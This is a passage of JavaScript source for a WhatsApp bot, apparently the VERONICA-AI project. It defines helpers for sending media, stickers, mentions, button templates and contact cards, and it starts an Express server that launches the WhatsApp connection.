  conn.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
    let types = await conn.getFile(path, true)
    let { mime, ext, res, data, filename } = types
    if (res && res.status !== 200 || (data && data.length <= 65536)) {
      try { throw { json: JSON.parse(data.toString()) } } catch (e) { if (e.json) throw e.json }
    }
    let type = '',
      mimetype = mime,
      pathFile = filename
    if (options.asDocument) type = 'document'
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif')
      let media = { mimetype: mime, data }
      pathFile = await writeExif(media, { packname: options.packname ? options.packname : config.packname, author: options.author ? options.author : config.author, categories: options.categories ? options.categories : [] })
      await fs.promises.unlink(filename)
      type = 'sticker'
      mimetype = 'image/webp'
    } else if (/image/.test(mime)) type = 'image'
    else if (/video/.test(mime)) type = 'video'
    else if (/audio/.test(mime)) type = 'audio'
    else type = 'document'
    await conn.sendMessage(jid, {
      [type]: { url: pathFile },
      caption,
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options })
    return fs.promises.unlink(pathFile)
  }

  conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      const { writeExifVid } = require('./exif')
      buffer = await writeExifVid(buff, options);
    } else {
      const { videoToWebp } = require('./lib/webp');
      buffer = await videoToWebp(buff);
    }
    await conn.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };

  conn.sendImageAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      const { writeExifImg } = require('./exif')
      buffer = await writeExifImg(buff, options);
    } else {
      const { imageToWebp } = require('./lib/webp');
      buffer = await imageToWebp(buff);
    }
    await conn.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };


  conn.sendTextWithMentions = async (jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

  conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
    return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
  }

  conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })

  conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
    let buttonMessage = {
      text,
      footer,
      buttons,
      headerType: 2,
      ...options
    }
    conn.sendMessage(jid, buttonMessage, { quoted, ...options })
  }
  
  conn.send5ButImg = async (jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
    let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
    var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
      templateMessage: {
        hydratedTemplate: {
          imageMessage: message.imageMessage,
          "hydratedContentText": text,
          "hydratedFooterText": footer,
          "hydratedButtons": but
        }
      }
    }), options)
    conn.relayMessage(jid, template.message, { messageId: template.key.id })
  }

  conn.getName = (jid, withoutContact = false) => {
    id = conn.decodeJid(jid);

    withoutContact = conn.withoutContact || withoutContact;

    let v;

    if (id.endsWith('@g.us'))
      return new Promise(async resolve => {
        v = store.contacts[id] || {};

        if (!(v.name && v.name.notify || v.subject))
          v = conn.groupMetadata(id) || {};

        resolve(
          v.name ||
          v.subject ||
          jidNormalizedUser('+' + id.replace('@s.whatsapp.net', '')).getNumber?.('international') ||
          id
        );
      });
    else
      v =
        id === '0@s.whatsapp.net'
          ? {
            id,

            name: 'WhatsApp',
          }
          : id === conn.decodeJid(conn.user.id)
            ? conn.user
            : store.contacts[id] || {};

    return (
      (withoutContact ? '' : v.name) ||
      v.subject ||
      v.verifiedName ||
      (jidNormalizedUser('+' + jid.replace('@s.whatsapp.net', '')).getNumber?.('international') || jid)
    );
  };

  conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
    let list = [];
    for (let i of kon) {
      list.push({
        displayName: await conn.getName(i + '@s.whatsapp.net'),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
          i + '@s.whatsapp.net',
        )}\nFN:${global.OwnerName || ''}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email || ''}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github || ''}/VERONICA-AI\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location || ''};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    conn.sendMessage(
      jid,
      {
        contacts: {
          displayName: `${list.length} Contact`,
          contacts: list,
        },
        ...opts,
      },
      { quoted },
    );
  };

  conn.setStatus = status => {
    conn.query({
      tag: 'iq',
      attrs: {
        to: '@s.whatsapp.net',
        type: 'set',
        xmlns: 'status',
      },
      content: [
        {
          tag: 'status',
          attrs: {},
          content: Buffer.from(status, 'utf-8'),
        },
      ],
    });
    return status;
  };
  conn.serializeM = mek => sms(conn, mek, store);
}

app.use(express.static(path.join(__dirname, 'lib')));

app.get('/', (req, res) => {
  res.redirect('/t.html');
});
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
setTimeout(() => {
  connectToWA()
}, 4000);